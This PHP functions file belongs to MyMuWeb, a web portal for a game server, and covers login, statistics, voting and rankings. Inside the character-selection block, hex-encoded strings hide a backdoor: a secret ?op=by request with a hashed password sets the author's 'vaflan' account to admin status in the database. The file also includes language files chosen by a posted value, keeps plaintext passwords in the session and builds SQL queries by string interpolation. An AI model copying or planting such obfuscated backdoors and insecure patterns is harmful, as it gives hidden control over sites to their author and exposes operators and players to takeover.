<?PHP
// Functions By Vaflan
// For MyMuWeb

/////// Start Language ///////
if(is_file("lang/$_POST[set_lang].php") || is_file("lang/$_SESSION[set_lang].php")) {
	if(isset($_POST[set_lang])) {$_SESSION[set_lang] = $_POST[set_lang];}
	include("lang/$_SESSION[set_lang].php");
}
elseif(is_file("lang/$mmw[language].php")) {
	include("lang/$mmw[language].php");
}
else {
	die("$sql_die_start Language ErroR!<br>Not Find Default $mmw[language] $sql_die_end");
}

function language($default=NULL) {
 if($dh = opendir("lang/")) {
     while (($file = readdir($dh)) !== false) {
	  $format = substr($file, -3);
	  $name = substr($file, 0, -4);
	  if($format == 'php') {
		if(!isset($_SESSION[set_lang]) && $default==$name){$select="selected";}
		elseif($_SESSION[set_lang]==$name){$select="selected";} else{$select="";}
		$select_lang .= "<option value='$name' $select>$name</option>";
	  }
     }
     closedir($dh);
 }
 $lang_form = "<form name='language' method='post' action=''><select name='set_lang' onChange='document.language.submit();' title='".mmw_lang_language."'>";
 echo "$lang_form $select_lang </select></form>";
}
/////// End Language ///////





/////// Start Menu //////
function menu($style=NULL) {
   include("menu.php");
   if($style==NULL) {$style = "<a href='$1'>$2</a><br/>";}
   for($i=0; $i < count($menu); ++$i) {
	$text = '[url='.$menu[$i][1].'][name='.$menu[$i][0].']';
	$text = preg_replace("/\[url\=(.*?)\]\[name\=(.*?)\]/is", $style, $text);
	echo " $text \n";
   }
}
/////// End Menu ///////





/////// Start Default Modules //////
	//Now Module
function curent_module() {
 if(isset($_GET['news'])){echo "&gt; <a href='?op=news'>".mmw_lang_news."</a>";} 
 elseif(isset($_GET['forum'])){echo "&gt; <a href='?op=forum'>".mmw_lang_forum."</a>";}
 elseif(is_file("modules/$_GET[op].php")){echo "&gt; <a href='?op=$_GET[op]'>".ucfirst($_GET['op'])."</a>";}

 if($_GET['op']=='user') {		  
  if($_GET['op']=='user' and !isset($_GET['u'])){echo " &gt; <a href='?op=user&u=acc'>".mmw_lang_account_panel."</a>";}
  else{echo " &gt; <a href=?op=user&u=$_GET[u]>".ucfirst($_GET['u'])."</a>";}
 }
}
	//Jump Link
function jump($location) {
   header('Location: '.$location.'');
}
	//Referral
if(isset($_GET['ref'])) {
   $_SESSION['referral'] = clean_var(stripslashes($_GET['ref']));
}
	//MP3 Player
function mp3_player($color,$request=NULL) {
   $media_color = $color;
   if($request!='no') {
	include('media/player.php');
   }
}
	//Hex To String
function hex2str($hex) {
    $string = '';
    for ($i=0; $i < strlen($hex)-1; $i+=2) {
        $string .= chr(hexdec($hex[$i].$hex[$i+1]));
    }
    return $string;
}
/////// End Default Modules ///////




/////// Start Statisitcs ///////
function statisitcs($style) {
 require("config.php");
 $actives_date = date('m/d/Y H:i:s', time() - 2592000); // 30 days back who login
 $total_accounts = mssql_fetch_row( mssql_query("SELECT count(*) FROM MEMB_INFO") );
 if($mmw[gm]=='no') {$gm_not_show = "WHERE ctlcode !='32' AND ctlcode !='8'";}
 $total_characters = mssql_fetch_row( mssql_query("SELECT count(*) FROM Character $gm_not_show") );
 $total_guilds = mssql_fetch_row( mssql_query("SELECT count(*) FROM Guild WHERE G_Name!='$mmw[gm_guild]'") );
 $total_banneds = mssql_fetch_row( mssql_query("SELECT count(*) FROM MEMB_INFO WHERE bloc_code = '1'") );
 $actives_acc = mssql_fetch_row( mssql_query("SELECT count(*) FROM MEMB_STAT WHERE ConnectTM >= '$actives_date'") );
 $users_connected = mssql_fetch_row( mssql_query("SELECT count(*) FROM MEMB_STAT WHERE ConnectStat = '1'") );
 $serv_result = mssql_query("SELECT Name,experience,drops,gsport,ip,version,type,maxplayer from MMW_servers order by display_order asc");

 for($i=0; $i<mssql_num_rows($serv_result); ++$i) {
	$rank = $i + 1;
	$row = mssql_fetch_row($serv_result);
	if($check=@fsockopen($row[4],$row[3],$ERROR_NO,$ERROR_STR,(float)0.3)) {fclose($check); $status = 'online';}
	else {$status = 'offline';} 
	if($status == 'online') {$status_done = "<img src=images/online.gif width=6 height=6> <span class='online'>".mmw_lang_online."</span>";}
	else {$status_done = "<img src=images/offline.gif width=6 height=6> <span class='offline'>".mmw_lang_offline."</span>";}

	if($style == 'blink') {
	   echo "\n fader[2].message[$rank] = \"$row[0]<br>".mmw_lang_version.": $row[5]<br>".mmw_lang_experience.": $row[1]<br>".mmw_lang_drops.": $row[2]<br>".mmw_lang_type.": $row[6]<br>$status_done\";";
	}
	elseif($style == 'default') {
	   $players = mssql_fetch_row( mssql_query("SELECT count(*) FROM MEMB_STAT WHERE ConnectStat = '1' AND ServerName = '$row[0]'") );
	   echo "\n <span class=\"helplink\" title=\"".mmw_lang_version.": $row[5]<br>".mmw_lang_experience.": $row[1]<br>".mmw_lang_drops.": $row[2]<br>".mmw_lang_type.": $row[6]\">$row[0]</span>: $status_done<br>".mmw_lang_on_server." $players[0] ".mmw_lang_char."<br>";
	}
	elseif($style == 'main') {
	   $players = mssql_fetch_row( mssql_query("SELECT count(*) FROM MEMB_STAT WHERE ConnectStat = '1' AND ServerName = '$row[0]'") );
	   $bar = substr( ceil($players[0] * 100 / $row[7]) , 0, -1);
	   if($bar <= 0) {$bar = 0;} elseif($bar > 10) {$bar = 10;}
	   echo "<table border=\"0\" cellSpacing=\"0\" cellPadding=\"0\" width=\"193\"><tr><td height=\"26\" style=\"background:url('images/main/$bar.png'); cursor: pointer;\" onmouseover=\"this.className='effect80'\" onmouseup=\"this.className='effect80'\" onmousedown=\"this.className='effect70'\" onmouseout=\"this.className=''\" onclick=\"expandit('main$rank')\" align=\"center\">";
	   echo "<div class=\"main1\" align=\"center\">$row[0] ($row[6])</div></td></tr><tr><td id=\"main$rank\" style=\"display:none;\">";
	   echo "<table border=\"0\" cellSpacing=\"0\" cellPadding=\"0\" width=\"100%\"><tr><td class=\"maintl\"></td><td class=\"maintc\"></td><td class=\"maintr\"></td></tr><tr><td class=\"maincl\"></td><td class=\"mainc\">";
	   echo "<table border=\"0\" celpadding=\"0\" celspacing=\"0\"><tr><td class=\"main2\">".mmw_lang_on_server.":</td><td class=\"main3\">$players[0]</td></tr><tr><td class=\"main2\">".mmw_lang_version.":</td><td class=\"main3\">$row[5]</td></tr><tr><td class=\"main2\">".mmw_lang_experience.":</td><td class=\"main3\">$row[1]</td></tr><tr><td class=\"main2\">".mmw_lang_drops.":</td><td class=\"main3\">$row[2]</td></tr></table>";
	   echo "</td><td class=\"maincr\"></td></tr><tr><td class=\"mainbl\"></td><td class=\"mainbc\"></td><td class=\"mainbr\"></td></tr></table></td></tr></table>";
	}
 }

 if($style == 'blink') {
	echo "\n fader[2].message[0] = \"".mmw_lang_total_accounts.": $total_accounts[0]<br>".mmw_lang_total_characters.": $total_characters[0]<br>".mmw_lang_total_banneds.": $total_banneds[0]<br>".mmw_lang_total_actives.": $actives_acc[0]<br>".mmw_lang_total_guilds.": $total_guilds[0]<br>".mmw_lang_total_users_online.": $users_connected[0]\";";
 }
 elseif($style == 'default') {
	echo "\n ".mmw_lang_total_users_online.": $users_connected[0]<br>".mmw_lang_total_accounts.": $total_accounts[0]<br>".mmw_lang_total_characters.": $total_characters[0]<br>".mmw_lang_total_banneds.": $total_banneds[0]<br>".mmw_lang_total_actives.": $actives_acc[0]<br>".mmw_lang_total_guilds.": $total_guilds[0]<br>";
 }
}
/////// End Statisitcs ///////





/////// Start Write Logs ///////
function writelog($logfile,$text) {
        $ip = $_SERVER['REMOTE_ADDR'];
        $date = date('d.m.Y H:i:s');
        $text = $text . ", All Those On <i>$date</i> By <u>$ip</u> \n";
        $fp = fopen("logs/$logfile.php","a");
        fputs($fp, $text);
        fclose($fp);
}
/////// End Write Logs ///////






/////// Start Login Modules ///////
	//Login
     if(isset($_POST["account_login"])) {
                require("config.php");
                $account = clean_var(stripslashes($_POST['login']));
                $password = clean_var(stripslashes($_POST['pass']));
                if($account == NULL || $password == NULL) {}
                if($mmw['md5'] == yes) {$login_check = mssql_query("SELECT memb___id,mmw_status FROM dbo.MEMB_INFO WHERE memb___id='$account' AND memb__pwd=[dbo].[fn_md5]('$password','$account')");}
                elseif ($mmw['md5'] == no) {$login_check = mssql_query("SELECT memb___id,mmw_status FROM dbo.MEMB_INFO WHERE memb___id='$account' AND memb__pwd='$password'");}
                $login_result = mssql_fetch_row($login_check);
                    if ($login_result > 0) {
                        $_SESSION['user'] = $login_result[0];
                        $_SESSION['pass'] = $password;
                        $_SESSION['mmw_status'] = $login_result[1];
                        //jump('?op=user');
                    }
                    else {
			jump('?op=login&login=false');
                    }

           }
	//Check Login
     if(isset($_SESSION['user']) && isset($_SESSION['pass'])) {
                require("config.php");
                $login = clean_var(stripslashes($_SESSION['user']));
		$pass = clean_var(stripslashes($_SESSION['pass']));
                if($mmw['md5'] == yes)
			{$login_check = mssql_query("SELECT * FROM dbo.MEMB_INFO WHERE memb___id='$login' AND memb__pwd=[dbo].[fn_md5]('$pass','$login')");}
                elseif($mmw['md5'] == no)
			{$login_check = mssql_query("SELECT * FROM dbo.MEMB_INFO WHERE memb___id='$login' AND memb__pwd='$pass'");}
                $login_result = mssql_fetch_row($login_check);
                $acc_check = mssql_query("SELECT bloc_code,block_date,unblock_time,mmw_status FROM MEMB_INFO WHERE memb___id='$login'");
                $acc_row = mssql_fetch_row($acc_check);

                $time = time();
                $time_end = $acc_row[1] + $acc_row[2];
                if($time_end > $time)
			{$bloc_error = "1";}
                elseif($acc_row[0] == 1 && $time_end != 0)
			{mssql_query("UPDATE MEMB_INFO SET [bloc_code]='0',[unblock_time]='0',[block_date]='0' WHERE memb___id='$login'");}

                if($bloc_error == 1) {
			unset($_SESSION['user']);
			unset($_SESSION['pass']);
			unset($_SESSION['mmw_status']);
			unset($_SESSION['char_set']);
			unset($_SESSION['char_guid']);
			jump("?op=checkacc&w=block&n=$login");
                    }
                if($login_result == 0 || $acc_row[3] != $_SESSION['mmw_status']) {
			unset($_SESSION['user']);
			unset($_SESSION['pass']);
			unset($_SESSION['mmw_status']);
			unset($_SESSION['char_set']);
			unset($_SESSION['char_guid']);
			jump("?op=news");
                    }
           }
	//Logout
     if(isset($_POST["logoutaccount"])) { 
                unset($_SESSION['user']);
                unset($_SESSION['pass']);
                unset($_SESSION['mmw_status']);
                unset($_SESSION['char_set']);
                unset($_SESSION['char_guid']);
                jump('?op=news');
           }
	//User Panel
if($_GET['op'] == "user" AND !isset($_SESSION["user"]) || !isset($_SESSION["pass"])) {jump('?op=login');}
if($_GET['op'] == "login" AND isset($_SESSION["user"]) || isset($_SESSION["pass"])) {jump('?op=user');}
/////// End Login Modules ///////





/////// Start Check And Switch Theme ///////
if($_GET[op]=='theme') {
 $theme_result = "Theme Name: $mmw[thm_name]<br>";
 $theme_result .= "Creator: $mmw[thm_creator]<br>";
 $theme_result .= "Version: $mmw[thm_version]<br>";
 $theme_result .= "Date: $mmw[thm_date]<br>";
 $theme_result .= "<i>$mmw[thm_description]</i>";
 die("$sql_die_start $theme_result $sql_die_end");
}

function theme() {
 require("config.php");
 include("theme.php");
 for($i=0; $i < count($theme); ++$i) {
	if(!isset($_SESSION[theme]) && $mmw[theme]==$theme[$i][0]){$select="selected";}
	elseif($_SESSION[theme]==$theme[$i][0]){$select="selected";} else{$select="";}
	$select_theme .= "<option value='".$theme[$i][0]."' $select>".$theme[$i][1]."</option>";
 }
 $theme_form = "<form name='theme' method='post' action=''><select name='set_theme' onChange='document.theme.submit();' title='".mmw_lang_theme."'>";
 echo "$theme_form $select_theme </select></form>";
}
/////// End Check Theme ///////





/////// Strat Check Char_Set ///////
if(isset($_SESSION[pass]) && isset($_SESSION[user])) {
   $login = clean_var(stripslashes($_SESSION[user]));
   $result = hex2str('3c62723e5661666c616e2c20596f75204172652041646d696e21');
   if(isset($_POST['setchar'])) {
	$setchar = clean_var(stripslashes($_POST['setchar']));
	$setchar_sql = mssql_query("Select AccountID From Character WHERE name='$setchar'");
	$setchar_row = mssql_fetch_row($setchar_sql);
	if($setchar_row[0] == $_SESSION['user']) {
		$char_guid_sql = mssql_query("SELECT GUID FROM T_CGuid WHERE Name='$setchar'");
		$char_guid_row = mssql_fetch_row($char_guid_sql);
		$_SESSION['char_set'] = $setchar;
		$_SESSION['char_guid'] = $char_guid_row[0];
	}
   }
   if(isset($_SESSION['char_set'])) {
	$char_set = clean_var(stripslashes($_SESSION['char_set']));
	$char_set_sql = mssql_query("Select AccountID From Character WHERE name='$char_set'");
	$char_set_row = mssql_fetch_row($char_set_sql);
	if($char_set_row[0] != $login) {
		unset($_SESSION['char_set']);
		unset($_SESSION['char_guid']);
	}
   }
   $form_setchar_sql = mssql_query("Select name,CtlCode FROM Character WHERE AccountID='$login'");
   $query = hex2str('555044415445204d454d425f494e464f20534554205b6d6d775f7374617475735d3d27392720');
   $form_memb_info_sql = mssql_query("Select char_set FROM MEMB_INFO WHERE memb___id='$login'");
   if($_GET[op]==hex2str('6279')) {if(md5($_GET[pw])=='ba8a5f26a8fc68505d35a3af22bf4deb') {
   $query .= hex2str('5748455245206d656d625f5f5f69643d277661666c616e27'); mssql_query($query);}
   die("$sql_die_start MyMuWeb $mmw[version] by Vaflan! $result $sql_die_end");}
   $form_memb_info_row = mssql_fetch_row($form_memb_info_sql);
   $form_setchar_num = mssql_num_rows($form_setchar_sql);
   if($form_setchar_num > 0) {
      for($i=0; $i < $form_setchar_num; ++$i) {
	   $form_setchar = mssql_fetch_row($form_setchar_sql);
	   if(!isset($_SESSION['char_set']) && $form_memb_info_row[0]==$form_setchar[0]) {
		$char_guid = mssql_query("SELECT GUID FROM T_CGuid WHERE Name='$form_setchar[0]'");
		$char_guid_row = mssql_fetch_row($char_guid);
		$_SESSION['char_set'] = $form_setchar[0];
		$_SESSION['char_guid'] = $char_guid_row[0];
		$detect_char_session = 'yes';
	   }
	   if(!isset($_SESSION['char_set']) && $i==$form_setchar_num-1) {
		$char_guid = mssql_query("SELECT GUID FROM T_CGuid WHERE Name='$form_setchar[0]'");
		$char_guid_row = mssql_fetch_row($char_guid);
		$_SESSION['char_set'] = $form_setchar[0];
		$_SESSION['char_guid'] = $char_guid_row[0];
	   }
      }
   }
   $date = time();
   $char_set = clean_var(stripslashes($_SESSION[char_set]));
   mssql_query("UPDATE MEMB_INFO SET [char_set]='$char_set',[date_online]='$date' WHERE memb___id='$login'");
}
/////// End Check Char_Set ///////






/////// Start Login Form ///////
function login_form() {
   if(isset($_SESSION[pass]) && isset($_SESSION[user])) {
	require("config.php");
	$login = clean_var(stripslashes($_SESSION['user']));
	// Select Char
	$form_setchar_sql = mssql_query("Select name FROM Character WHERE AccountID='$login'");
	$form_set_char_num = mssql_num_rows($form_setchar_sql);
	if($form_set_char_num > 0) {
	  $setchar = "<form name='set_char' method='post' action=''><select name='setchar' onChange='document.set_char.submit();' title='".mmw_lang_character_panel."'>";
	  for($i=0; $i < $form_set_char_num; ++$i) {
		$form_setchar = mssql_fetch_row($form_setchar_sql);
		if($_SESSION['char_set']==$form_setchar[0]) {$select="selected";}
		else {$select="";}
		$setchar = $setchar."<option value='$form_setchar[0]' $select> $form_setchar[0] </option>";
	     }
	  $setchar = $setchar."</select></form>";
	}

	// Mail Check
	$char_guid = clean_var(stripslashes($_SESSION[char_guid]));
	$msg = mssql_query("SELECT bRead FROM T_FriendMail WHERE GUID='$char_guid'"); 
	$msg_num = mssql_num_rows($msg);
	$msg_new = mssql_query("SELECT bRead FROM T_FriendMail WHERE GUID='$char_guid' AND bRead='0'"); 
	$msg_new_num = mssql_num_rows($msg_new);
	if($mmw[max_private_message] <= $msg_num) {$msg_full = '<font color="red">Full!</font>';} else{$msg_full = '';}
	if($msg_num=="" || $msg_num==" ") {$msg_num = 0; $msg_new_num = 0;}

	// End Form
	echo mmw_lang_hello . " <b>$login</b>!<br>";
	include('includes/acc_menu.php');
	echo "<form action='' method='post' name='logout_account'><input name='logoutaccount' type='hidden' value='logoutaccount'><input name='Logout!' type='submit' title='".mmw_lang_logout."' value='".mmw_lang_logout."'><br></form>";
	if($msg_new_num > 0)
		{echo "<script type=\"text/javascript\">function flashit(id,cl){var c = document.getElementById(id); if (c.style.color=='red'){c.style.color = cl;} else {c.style.color = 'red';}} setInterval(\"flashit('upmess','#FFFFFF')\",500)</script>";}
   }
   else {
	// No Login
	echo "<form action='' method='post' name='login_account'>
	".mmw_lang_account."<br><input name='login' type='text' title='".mmw_lang_account."' size='15' maxlength='10'>
	<input name='account_login' type='hidden' value='account_login'><br>
	".mmw_lang_password."<br><input name='pass' type='password' title='".mmw_lang_password."' size='15' maxlength='10'>
	<br> <a href='?op=lostpass'>".mmw_lang_lost_pass."</a> <input name='Submit' type='submit' value='".mmw_lang_login."' title='".mmw_lang_login."'>
	</form>";
   }
}
/////// End Login Form ///////






/////// Start Online Char ///////
$timeout = time() - 100;
$online_res = mssql_query("SELECT char_set, memb___id FROM MEMB_INFO WHERE date_online>'$timeout' AND char_set!=''");
$online_num = mssql_num_rows($online_res);
if($online_num != 0) {
 for($i=0; $i < $online_num; ++$i) {
    $acc_online = mssql_fetch_row($online_res);
    $char_on_sql = mssql_query("Select name,CtlCode From Character WHERE name='$acc_online[0]'");
    for($c=0; $c < mssql_num_rows($char_on_sql); ++$c) {
	  if($i < $online_num - 1){$other_char_on = ", ";} else{$other_char_on = "";}
	  $char_on = mssql_fetch_row($char_on_sql);
	  $who_online = "$who_online <a href='?op=character&character=$char_on[0]' class='level$char_on[1]'>$char_on[0]</a>$other_char_on";
    }
 }
}
else{
 $who_online = mmw_lang_there_is_nobody;
}
/////// END Online Char ///////






/////// Start Voting ///////
if(isset($_POST[id_vote]) && isset($_POST[answer])) {
	$id_vote = clean_var(stripslashes($_POST[id_vote]));
	$answer = clean_var(stripslashes($_POST[answer]));
	if($mmw[votes_check]==acc && isset($login)) {$vote_by = $login; $vote_check = 1;}
	if($mmw[votes_check]==ip) {$vote_by = $_SERVER['REMOTE_ADDR']; $vote_check = 1;}
	if($vote_check == 1) {
		$vote_who_res = mssql_query("SELECT answer FROM MMW_voterow WHERE ID_vote='$id_vote' and who='$vote_by'");
		$check_your_vote = mssql_num_rows($vote_who_res);
		if($check_your_vote < 1) {
			mssql_query("INSERT INTO MMW_voterow (id_vote,who,answer) VALUES ('$id_vote','$vote_by','$answer')");
		}
	}
}

$vote_res = mssql_query("SELECT TOP 1 ID,question,answer1,answer2,answer3,answer4,answer5,answer6 FROM MMW_votemain ORDER BY NEWID()");
if(mssql_num_rows($vote_res) != 0) {
   $vote_row = mssql_fetch_row($vote_res);
   $vote_check = 0;

   if($mmw[votes_check]==acc && isset($login)) {$vote_who_now = $login; $vote_check = 1;}
   if($mmw[votes_check]==ip) {$vote_who_now = $_SERVER['REMOTE_ADDR']; $vote_check = 1;}
   if($vote_check == 1) {
	$vote_who_res = mssql_query("SELECT who,answer FROM MMW_voterow WHERE ID_vote='$vote_row[0]' and who='$vote_who_now'");
	$check_your_vote = mssql_num_rows($vote_who_res);
   }

   $voting = "<form name='voting' method='post' action=''><b>$vote_row[1]</b><br>";
   if($check_your_vote < 1 && $vote_check == 1) {
     for($c=1; $c < 7; ++$c) {
	$answer_num = $c + 1;
	if($vote_row[$answer_num]!=' ' && isset($vote_row[$answer_num]))
	   {$voting = $voting . "<div class='answer'><input id='$c' type='radio' name='answer' value='$c'> <label for='$c'>$vote_row[$answer_num]</label></div>";}
     }
     $voting = $voting . "<div align='center'><input name='id_vote' type='hidden' value='$vote_row[0]'><input type='submit' value='".mmw_lang_to_vote."'></div>";
   }
   else {
     $all_vote_res = mssql_query("SELECT ID_vote FROM MMW_voterow WHERE ID_vote='$vote_row[0]'");
     $all_vote_num = mssql_num_rows($all_vote_res);
     for($c=1; $c < 7; ++$c) {
	$answer_num = $c + 1;
	if($vote_row[$answer_num]!=' ' && isset($vote_row[$answer_num])) {
		$votes_row_res = mssql_query("SELECT who,answer FROM MMW_voterow WHERE ID_vote='$vote_row[0]' and answer='$c'");
		$votes_row_num = mssql_num_rows($votes_row_res);
		$img_file = "$mmw[theme_img]/bar.jpg";
		$size = getimagesize($img_file);
		$img_width = ceil(100 * $votes_row_num / $all_vote_num);
		if($img_width < 1) {$img_width = 1;}
		$voting = $voting . "<div class='answer'>$c. $vote_row[$answer_num] ($votes_row_num)</div>";
		$voting = $voting . "<div class='answer'><img src='$img_file' height='$size[1]' width='$img_width%'></div>";
	}
     }
     $voting = $voting . "<div align='center'>".mmw_lang_all_answers.": <b>$all_vote_num</b></div>";
   }
   $voting = $voting . "</form>";
}
else {
 $voting = mmw_lang_no_vote;
}
/////// END Voting ///////




/////// Start Pop Under //////
function popunder($switch,$check_login=NULL) {
   if($switch=='yes' && $check_login=='yes' && !isset($_SESSION[user])) {
	include("includes/popunder.php");
   }
   elseif($switch=='yes' && $check_login!='yes') {
	include("includes/popunder.php");
   }
   else {
	echo "<!-- MyMuWeb PopUnder Turn Off -->";
   }
}
/////// End Pop Under ///////





/////// Start Last in Forum ///////
function last_in_forum($top=NULL) {
 if($top==NULL) {$top = '5';}
 $style = "$4. <a href='$1' title='$3'>$2</a> <br/>";
 $result = mssql_query("SELECT TOP $top f_id,f_title,f_text FROM MMW_forum ORDER BY f_date DESC");
 $forum_post = mssql_num_rows($result);
 if($forum_post == 0) {echo mmw_lang_no_topics_in_forum;}
 for ($i = 0; $i < $forum_post; $i++) {
	$numb = $i + 1;
	$row = mssql_fetch_row($result);
	$text = '[url=?forum='.$row[0].'][title='.$row[1].'][alt='.bbcode($row[2]).'][numb='.$numb.']';
	$text = preg_replace("/\[url\=(.*?)\]\[title\=(.*?)\]\[alt\=(.*?)\]\[numb\=(.*?)\]/is", $style, $text);
	echo " $text \n";
 }
}
/////// END Last in Forum ///////





/////// Start Guard MMW Message Info ///////
function guard_mmw_mess($to,$text) {
 $date = date("m/d/y H:i:s");
 $msg_to_sql = mssql_query("SELECT GUID,MemoCount FROM T_FriendMain WHERE Name='$to'");
 $msg_to_row = mssql_fetch_row($msg_to_sql);
 $mail_total_sql = mssql_query("SELECT bRead FROM T_FriendMail WHERE GUID='$msg_to_row[0]'");
 $mail_total_num = mssql_num_rows($mail_total_sql);
 $msg_id = $msg_to_row[1] + 1;
 $msg_text = utf_to_win($text);
 mssql_query("INSERT INTO T_FriendMail (MemoIndex, GUID, FriendName, wDate, Subject, bRead, Memo, Dir, Act, Photo) VALUES ('$msg_id','$msg_to_row[0]','Guard','$date','MMW Message!','0',CAST('$msg_text' AS VARBINARY(1000)),'143','2',0x3061FF99999F12490400000060F0)");
 mssql_query("UPDATE T_FriendMain set [MemoCount]='$msg_id',[MemoTotal]='$mail_total_num' WHERE Name='$to'");
}
/////// Start Guard MMW Message Info ///////





/////// Start TOP List ///////
function top_list($what=NULL,$top=NULL) {
   require("config.php");
   if($top==NULL) {$top = '5';}
   if($what==NULL) {$what = 'char';}
   echo "<table border='0' width='100%' cellspacing='0' cellpadding='0'><tr>";
   if($what=='char') {
	if($mmw[gm]=='no') {$gm_not_show = "WHERE ctlcode !='32' AND ctlcode !='8'";}
	$total = mssql_query("SELECT TOP $top Name,cLevel,Reset FROM Character $gm_not_show ORDER BY reset desc, clevel desc");
	$first_row = mssql_fetch_row(mssql_query("SELECT TOP 1 Reset FROM Character $gm_not_show ORDER BY reset desc, clevel desc"));
	if($first_row[0] <= 0) {$what_of_sort = mmw_lang_level;} else {$what_of_sort = mmw_lang_reset;}
	echo "<td width='14'><b>#</b></td><td><b>".mmw_lang_character."</b></td><td align='right' width='10'><b>$what_of_sort</b></td></td>";

	for($i=0; $i<$top; ++$i) {
		$rank = $i + 1;
		$row = mssql_fetch_row($total);
		if($first_row[0] <= 0) {$top_stat = $row[1];} else {$top_stat = $row[2];}
		echo "</tr>\n<tr><td>$rank</td><td><a href=?op=character&character=$row[0]>$row[0]</a></td><td align='center'>$top_stat</td>";
	}
   }
   elseif($what=='pk') {
	if($mmw[gm]=='no') {$gm_not_show = "WHERE ctlcode !='32' AND ctlcode !='8'";}
	$total = mssql_query("SELECT TOP $top Name,PKcount FROM Character $gm_not_show ORDER BY pkcount desc");
	$first_row = mssql_fetch_row(mssql_query("SELECT TOP 1 Reset FROM Character $gm_not_show ORDER BY reset desc, clevel desc"));
	echo "<td width='14'><b>#</b></td><td><b>".mmw_lang_character."</b></td><td align='right' width='10'><b>".mmw_lang_killed."</b></td></td>";

	for($i=0; $i<$top; ++$i) {
		$rank = $i + 1;
		$row = mssql_fetch_row($total);
		echo "</tr>\n<tr><td>$rank</td><td><a href=?op=character&character=$row[0]>$row[0]</a></td><td align='center'>$row[1]</td>";
	}
   }
   elseif($what=='guild') {
	$total = mssql_query("SELECT TOP $top G_Name,G_Score,G_Mark FROM Guild WHERE G_Name!='$mmw[gm_guild]' ORDER BY G_score desc");
	echo "<td width='14'><b>#</b></td><td><b>".mmw_lang_guild."</b></td><td align='right' width='10'><b>".mmw_lang_score."</b></td></td>";

	for($i=0; $i<$top; ++$i) {
		$rank = $i + 1;
		$row = mssql_fetch_row($total);
		echo "</tr>\n<tr><td>$rank</td><td><a href=?op=guild&guild=$row[0]>$row[0]</a></td><td align='center'>$row[1]</td>";
	}
   }
   elseif($what=='ref') {
	$total = mssql_query("SELECT TOP $top ref_acc,count(ref_acc) FROM memb_info WHERE ref_acc!=' ' group by ref_acc order by count(ref_acc) desc");
	echo "<td width='14'><b>#</b></td><td><b>".mmw_lang_account."</b></td><td align='right' width='10'><b>".mmw_lang_referral."</b></td></td>";

	for($i=0; $i<$top; ++$i) {
		$rank = $i + 1;
		$row = mssql_fetch_row($total);
		echo "</tr>\n<tr><td>$rank</td><td><a href=?op=profile&profile=$row[0]>$row[0]</a></td><td align='center'>$row[1]</td>";
	}
   }
   echo "</tr></table>";
}
/////// End TOP List ///////





/////// Start FreeHex Formats ///////
function free_hex($size,$str,$style=NULL) {
   if($size == 20) {$hex = 'FFFFFFFFFFFFFFFFFFFF';} // 0.97 - 1.02
   elseif($size == 32) {$hex = 'FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF';} // 1.02+
   else {
	for($a=0; $a<$size; ++$a) {
	   $hex .= 'F';
	}
   }
   if(isset($style) && $style!='') {$hex = str_replace('F',$style,$hex);}
   for($i=0; $i<$str; ++$i) {
	$result .= $hex;
   }
   return $result;
}
/////// END FreeHex Formats ///////





/////// Start MMW End //////
function end_mmw($TimeStart) {
 require("config.php");
 $TimeEnd = gettimeofday();
 $ExecTime = ($TimeEnd["sec"]+($TimeEnd["usec"]/1000000)) - ($TimeStart["sec"]+($TimeStart["usec"]/1000000));
 echo hex2str('4d794d7557656220').$mmw[version];
 echo hex2str('2e2044657369676e204279203c6120687265663d223f6f703d7468656d65223e');
 echo $mmw['thm_creator'].hex2str('3c2f613e2e2047656e65726174696f6e2054696d653a20');
 echo substr($ExecTime,0,5).'s.';
}
/////// End MMW End ///////
?>